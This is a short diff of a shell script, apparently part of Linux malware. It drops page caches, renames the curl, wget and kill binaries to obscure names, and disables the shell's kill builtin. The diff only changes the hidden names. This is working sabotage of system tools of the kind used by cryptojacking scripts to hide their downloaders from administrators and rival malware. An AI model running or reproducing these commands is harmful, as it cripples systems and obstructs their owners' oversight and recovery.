@@ -894,15 +894,15 @@ sync && echo 3 >/proc/sys/vm/dro
 sync && echo 3 >/proc/sys/vm/drop_caches
 
 bbdir="/usr/bin/curl"
-bbdira="/usr/bin/cd1"
+bbdira="/usr/bin/cdr1"
 ccdir="/usr/bin/wget"
-ccdira="/usr/bin/wd1"
+ccdira="/usr/bin/wde1"
 ccdir="/usr/bin/kill"
 ccdira="/usr/bin/kl1"
 mv /usr/bin/curl /usr/bin/url
-mv /usr/bin/url /usr/bin/cd1
+mv /usr/bin/url /usr/bin/cdr1
 mv /usr/bin/wget /usr/bin/get
-mv /usr/bin/get /usr/bin/wd1
+mv /usr/bin/get /usr/bin/wde1
 mv /usr/bin/kill /usr/bin/kib
 mv /usr/bin/kib /usr/bin/kl1
 enable -n kill
